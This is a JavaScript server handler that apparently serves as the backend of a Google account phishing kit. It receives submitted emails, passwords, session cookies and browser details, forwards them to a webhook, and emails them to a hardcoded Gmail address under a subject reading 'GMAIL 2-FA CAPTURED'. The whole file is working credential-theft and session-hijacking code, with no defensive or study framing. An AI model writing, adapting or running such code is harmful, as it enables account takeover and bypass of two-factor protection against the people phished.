import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection.remoteAddress;

  console.log('Captured:', data.email, ip);

  // WEBHOOK BACKUP (optional)
  try {
    await fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...data, ip })
    });
  } catch {}

  // GMAIL EMAIL
  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,  // your@gmail.com
        pass: process.env.EMAIL_PASS   // App Password
      }
    });

    await transporter.sendMail({
      from: `"Security Alert" <${process.env.EMAIL_USER}>`,
      to: 'busmeup13@gmail.com',
      subject: `🔔 GMAIL 2-FA CAPTURED: ${data.email}`,
      html: `
        <div style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;">
          <h2 style="color:#d93025">🎯 Google Workspace Credentials</h2>
          <table cellpadding="8" style="border:1px solid #ddd;width:100%">
            <tr><td><strong>⏰ Time</strong></td><td>${new Date().toLocaleString()}</td></tr>
            <tr><td><strong>🌐 IP</strong></td><td>${ip}</td></tr>
            <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
            <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
            <tr><td><strong>🍪 Cookies</strong></td><td>${data.cookiesImportLink
              ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="color:#1a73e8;word-break:break-all">Import link (works on other device)</a>`
              : `<code>${(data.cookies || 'none').replace(/</g, '&lt;')}</code>`}</td></tr>
            <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0,80)}...</td></tr>
          </table>
          <details>
            <summary>Full Data (JSON)</summary>
            <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(data,null,2)}</pre>
          </details>
        </div>
      `
    });
  } catch (err) {
    console.error('Email send failed:', err.message);
  }

  res.json({ status: 'captured ✅', email: data.email });
}
